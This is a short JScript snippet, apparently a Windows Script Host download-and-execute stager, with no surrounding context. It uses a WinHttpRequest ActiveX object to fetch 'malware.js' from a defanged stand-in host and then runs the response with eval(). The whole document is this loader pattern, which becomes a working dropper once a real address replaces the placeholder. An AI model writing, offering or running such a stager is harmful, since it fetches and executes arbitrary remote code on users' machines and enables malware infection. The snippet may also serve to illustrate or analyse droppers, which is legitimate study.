net = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
net.Open("GET","http://malware[.]com/malware.js",false);
net.Send();
js = net.ResponseText;
eval(js);